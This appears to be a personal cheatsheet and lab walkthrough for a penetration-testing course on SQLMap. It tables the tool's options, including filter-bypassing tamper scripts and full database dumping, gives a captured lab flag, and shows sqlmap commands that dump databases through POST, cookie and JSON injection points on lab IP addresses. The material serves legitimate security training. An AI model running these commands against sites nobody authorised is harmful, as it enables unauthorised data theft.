SQLMap Essentials
Getting Started

This note will look more like a cheatsheet than other ones since it’s intended to be used as such.

Here is a recap of most important options and tools that SQLMap offers before the Module notes :
Option	Description
--data	add content to the body (imply POST if used)
-H	same as cURL headers : 'Header-name:parameter=value'
--method	specify the method (eg. --method PUT)
-r	specify input file to be used for request
--batch	stop asking for user input (use default)
--dump	output the content of the findings automatically
--forms	parse and test forms on target URL
--parse-errors	output errors encountered during the tests
--proxy https://127.0.0.1:8080/	send the requests through Burpsuite
--prefix / --suffix	add prefix or suffix to the vector used by SQLMap
--level 1-5	amount of vectors and boundaries used during tests
--risk 1-3	potential to alter the server state with used payloads
-T {table_name}	table to enumerate
-C {column_name}	column to enumerate
-D {Database_name}	database to enumerate
--where="name LIKE '%keyword%'"	search for values using LIKE operator
--search	prefix option for db/table/columns search with a specific value
--is-dba	check wether the current-user has privileged rights on the db
--tamper=	specify some tampering options to bypass active filtering on our input

    Hack The Box
    PortSwigger : WebSecurity Academy
    Root Me

    Broken Authentication
    Bug Bounty Hunting Process
    Command Injections
    Cross-Site Scripting (XSS)
    Documentation & Reporting
    File Inclusion
    File Upload Attacks
    Getting Started
    Introduction to Web Applications
    JavaScript Deobfuscation
    Login Brute Forcing
    Network Enumeration with Nmap
    Penetration Testing Process
    Server-side Attacks
    SQL Injection Fundamentals
    SQLMap Essentials
    Using Web Proxies
    Web Attacks
    Web Fuzzing
    Web Requests

Backlinks

    Introduction to Web Applications
    Web Requests
    SQL Injection
    Hack The Box

SQLMap Essentials
Home

❯
HTB

❯
CPTS & CWES Notes

❯
SQLMap Essentials

    HTB
    Note
    CWES
    CPTS

Getting Started

This note will look more like a cheatsheet than other ones since it’s intended to be used as such.

Here is a recap of most important options and tools that SQLMap offers before the Module notes :
Option	Description
--data	add content to the body (imply POST if used)
-H	same as cURL headers : 'Header-name:parameter=value'
--method	specify the method (eg. --method PUT)
-r	specify input file to be used for request
--batch	stop asking for user input (use default)
--dump	output the content of the findings automatically
--forms	parse and test forms on target URL
--parse-errors	output errors encountered during the tests
--proxy https://127.0.0.1:8080/	send the requests through Burpsuite
--prefix / --suffix	add prefix or suffix to the vector used by SQLMap
--level 1-5	amount of vectors and boundaries used during tests
--risk 1-3	potential to alter the server state with used payloads
-T {table_name}	table to enumerate
-C {column_name}	column to enumerate
-D {Database_name}	database to enumerate
--where="name LIKE '%keyword%'"	search for values using LIKE operator
--search	prefix option for db/table/columns search with a specific value
--is-dba	check wether the current-user has privileged rights on the db
--tamper=	specify some tampering options to bypass active filtering on our input
SQLMap Overview

SQLMap covers all SQL types of injection (BEUSTQ) :

    Boolean-based
    Error-based
    Union query-based
    Stacked queries
    Time-based
    Inline queries

Note that these tests are covered in the Burpsuite active scanner.



Building Attacks
Running SQLMap on an HTTP Request

Specific injection point must be indicated using *.

Use copy as cURL in Browser dev tools and copy paste then swap curl for SQLMap. (learned this early 2025, saves so much time).

Otherwise copy the request in a file and use it as an input for SQLMap through -r {file}. HTB recommends to use the file option for long request (especially in the body section).

Useful commands have been added to the table in Getting Started.
Questions

What's the contents of table flag2? (Case #2)

HTB{700_much_c0n6r475_0n_p057_r3qu357}

    Solution

    Try to go without any information given (the example tells to scan for id parameter on POST requests). A simple sqlmap 'http://94.237.50.128:40097/case2.php' will prompt you to use --forms which in this case detect the id parameter. You’ll get a positive SQLMap output for injection with indicated payloads. Now we can run the command :

sqlmap 'http://94.237.50.128:40097/case2.php' --data 'id=1' --batch --dump

This amazing tool will just output you everything even what you didn’t ask for, including the content of the table flag2

<img width="2058" height="518" alt="image" src="https://github.com/user-attachments/assets/db65994b-d1b4-4d92-ab66-ecde2595af03" />

Same principle, if we don’t give any specific cookie here the server response is setting one to id=1 on it’s own, which SQLMap catches. However it won’t lookup for it by default which means you’ll have to specify it. Knowing this, we can use the following command and retrieve the specified content :

sqlmap 'http://94.237.51.160:50122/case3.php' --cookie 'id=1*' --dump

<img width="2054" height="426" alt="image" src="https://github.com/user-attachments/assets/45753c48-8603-4912-b038-7ccb11aa8c4c" />


Use sqlmap 'http://94.237.51.160:50122/case4.php' --data '{"id": 1*}' --dump to exploit the SQLi in the json payload.

<img width="2057" height="315" alt="image" src="https://github.com/user-attachments/assets/85e04012-b7c3-4a5f-8d0c-759161ca51db" />

